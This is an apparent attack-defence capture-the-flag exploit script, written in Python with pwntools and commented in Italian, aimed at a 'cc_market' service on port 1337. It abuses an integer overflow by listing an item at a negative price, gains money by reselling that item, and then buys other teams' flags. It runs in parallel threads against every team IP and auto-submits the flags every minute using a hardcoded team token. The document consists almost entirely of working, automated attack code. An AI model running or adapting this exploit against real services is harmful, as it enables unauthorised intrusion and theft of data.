#/usr/bin/python3

import requests, time, re, random
from threading import Thread, Lock
from pwn import *

TEAM_TOKEN = "ddfe3c79ffdb518891f4f82ea90b433f"			# TEAM_TOKEN INVIATO PER EMAIL
CHALLENGE_NAME = "cc_market"							# NOME DELLA CHALLENGE INDICATO IN flagIds

flags = []
threads = []
lock = Lock()

def generate_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

class Attacker(Thread):
	def __init__(self, ip, flagids):
		Thread.__init__(self)
		self.ip = ip
		self.flagids = flagids
		

	def run(self):
		flag_list = []
		for hint in self.flagids[CHALLENGE_NAME][self.ip]:
			try:
				flag = get_flag(self.ip, hint)
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)
	
		lock.acquire()
		flags.extend(flag_list)
		lock.release()


def exploit(flagids):
	c = 1
	i = 0
	size = len(flagids[CHALLENGE_NAME])
	for ip in flagids[CHALLENGE_NAME]:
		print(f"{ip}\t-\t{c} / {size} ...")

		threads.append(Attacker(ip, flagids))
		threads[i].start()

		i += 1
		c += 1
	
	for i in range(size):
		threads[i].join()
			
	
def get_flag(ip, hint):
	p = remote(ip, 1337)
	
	username = generate_random_string(8).encode()
	password = generate_random_string(8).encode()
	descrizione = generate_random_string(4).encode()
	item_name = generate_random_string(4).encode()
	date = str(random.randint(0, 10)).encode()
	price = "-2147481661".encode()
	
	# registrazione
	p.recvuntil(b"> ", timeout=5)
	p.sendline(b"1")

	p.recvuntil(b": ", timeout=5)
	p.sendline(username)
	p.recvuntil(b": ", timeout=5)
	p.sendline(password)
	p.recvuntil(b": ", timeout=5)
	p.sendline(descrizione)

	# login
	p.recvuntil(b"> ", timeout=5)
	p.sendline(b"2")

	p.recvuntil(b": ", timeout=5)
	p.sendline(username)
	p.recvuntil(b": ", timeout=5)
	p.sendline(password)

	# add item
	p.recvuntil(b"> ", timeout=5)
	p.sendline(b"4")

	p.recvuntil(b": ", timeout=5)
	p.sendline(item_name)
	p.recvuntil(b": ", timeout=5)
	p.sendline(date)
	p.recvuntil(b": ", timeout=5)
	p.sendline(price)

	# sell
	p.recvuntil(b"> ", timeout=5)
	p.sendline(b"5")

	resp = p.recvuntil(b"?", timeout=5).decode().split("\n")
	num_sell = 0
	for row in resp:
		if "\t" in row:
			break

		row_splitted = row.split(" ")
		if row_splitted[1] == item_name.decode():
			num_sell = row_splitted[0][:-1]

	num_sell = str(num_sell).encode()
	p.sendline(num_sell)

	# buy to earn money
	p.recvuntil(b"> ", timeout=5)
	p.sendline(b"6")

	resp = p.recvuntil(b"?", timeout=5).decode().split("\n")
	num_buy = 0
	for row in resp:
		row_splitted = row.split("\t")
		if ")" not in row_splitted[0]:
			continue

		if row_splitted[1].strip() == item_name.decode():
			num_buy = row_splitted[0][:-2]

	num_buy = str(num_buy).encode()
	p.sendline(num_buy)

	# buy flag
	p.recvuntil(b"> ", timeout=5)
	p.sendline(b"6")

	resp = p.recvuntil(b"?", timeout=5).decode().split("\n")
	num_buy = 0
	for row in resp:
		row_splitted = row.split("\t")
		if ")" not in row_splitted[0]:
			continue

		if row_splitted[3].split("by ")[1].strip() == hint:
			num_buy = row_splitted[0][:-2]

	num_buy = str(num_buy).encode()
	p.sendline(num_buy)

	resp = p.recvuntil(b"=").decode()
	flag = re.findall("[A-Z0-9]{31}=", resp)[0]
	p.close()
	return flag
	


## TEST get_flag
# hint = "603c31b2cdd519622ff"
# flag = get_flag("10.60.0.1", hint)
# print(flag)
# exit()



# EXPLOIT FINALE
while True:
	flags = []
	threads = []

	print("Running exploit...")
	flagids = requests.get("http://10.10.0.1:8081/flagIds").json()
	exploit(flagids)
	print(flags)


	print("Putting flags...")
	r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
	print(r)
	print("Exploit ok...\nRepeat...")
	print("\n")

	time.sleep(60)




